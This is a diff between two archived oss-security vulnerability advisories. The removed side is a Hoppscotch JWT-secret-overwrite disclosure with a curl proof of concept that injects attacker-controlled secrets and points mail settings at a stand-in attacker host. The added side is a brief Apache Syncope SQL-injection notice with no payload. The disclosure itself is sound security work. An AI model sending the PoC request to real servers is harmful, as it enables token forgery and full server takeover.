@@ -1,63 +1,40 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2026/06/23/7
-Message-ID: <CAAZhgk6BLONS0YuZmkCiAt7_Cg96AQ87bGdD8DQUueJtiRUP3A@mail.gmail.com>
-Date: Tue, 23 Jun 2026 23:07:56 +0530
-From: Aditi Bhatnagar <aditi@...gridsec.com>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2026/09/14/21
+Message-ID: <141e79e8-c8fb-676c-d1ae-4e9498d17c59@apache.org>
+Date: Mon, 14 Sep 2026 08:45:56 +0000
+From: Francesco Chicchiriccò <ilgrosso@...che.org>
 To: oss-security@...ts.openwall.com
-Subject: [CVE-2026-50160] Hoppscotch: Unauthenticated JWT Secret Overwrite (CVSS 10.0)
+Subject: CVE-2026-82232: Apache Syncope: SQL injection via sort parameter in Task search 
 Content-Type: text/plain; charset=utf-8
 
-Hello,
+Severity: important 
 
-We are reporting a critical vulnerability in Hoppscotch, an open source
-self-hosted API development platform (79,000+ GitHub stars).
+Affected versions:
 
-CVE:      CVE-2026-50160
-CVSS:     10.0 (Critical)
-GHSA:
-https://github.com/hoppscotch/hoppscotch/security/advisories/GHSA-j542-4rch-8hwf
-Affected: Hoppscotch self-hosted <= 2026.4.1
-Fixed:    2026.5.0
+- Apache Syncope (org.apache.syncope.core:syncope-core-persistence-jpa) 3.0.0-M0 through 3.0.16
+- Apache Syncope (org.apache.syncope.core:syncope-core-persistence-jpa) 4.0.0-M0 through 4.0.7
+- Apache Syncope (org.apache.syncope.core:syncope-core-persistence-jpa) 4.1.0-M0 through 4.1.2
 
-Summary:
+Description:
 
-The POST /v1/onboarding/config endpoint allows an unauthenticated attacker
-to inject arbitrary InfraConfig keys including JWT_SECRET and
-SESSION_SECRET
-into the database via mass assignment. Four independent weaknesses combine
-to enable this:
+Improper neutralization of special elements used in an SQL command ('SQL injection') vulnerability in Apache Syncope.
 
-1. NestJS ValidationPipe missing whitelist:true - extra request body
-   properties are not stripped
-2. Object.entries(dto) iterates all properties without runtime validation
-3. validateEnvValues has default:break - JWT_SECRET passes silently
-4. No authentication on the onboarding endpoint
 
-An attacker controlling JWT_SECRET can forge tokens for any user including
-admin, resulting in full server compromise. The attack works on any fresh
-Hoppscotch deployment before onboarding completes, or when re-onboarding is
-enabled.
 
-Proof of concept:
+An administrator with adequate entitlements can achieve execution of arbitrary SQL via stacked queries, leveraging unsanitized sort clauses for Task search.
 
-curl -X POST http://target:3170/v1/onboarding/config \
-  -H "Content-Type: application/json" \
-  -d '{
-    "VITE_ALLOWED_AUTH_PROVIDERS": "EMAIL",
-    "MAILER_SMTP_ENABLE": "true",
-    "MAILER_SMTP_URL": "smtp://attacker.com:25",
-    "MAILER_ADDRESS_FROM": "attacker@...l.com",
-    "JWT_SECRET": "ATTACKER_CONTROLLED_JWT_SECRET",
-    "SESSION_SECRET": "ATTACKER_CONTROLLED_SESSION"
-  }'
+This issue affects Apache Syncope: from 3.0.0-M0 through 3.0.16, from 4.0.0-M0 through 4.0.7, from 4.1.0-M0 through 4.1.2.
 
-Fix:
 
-Upgrade to Hoppscotch 2026.5.0. Full fix details and root cause analysis
-in the advisory linked above.
 
-Full writeup: https://www.offgridsec.com/blog-hoppscotch-cve-2026-50160.html
+Users are recommended to upgrade to version 4.0.8 / 4.1.3, which fix this issue.
 
-Reported by: Offgrid Security (https://offgridsec.com)
-Found by:    Kira, model-agnostic autonomous AI security agent
+Credit:
+
+Alon Galili (finder)
+
+References:
+
+https://syncope.apache.org/
+https://www.cve.org/CVERecord?id=CVE-2026-82232
 
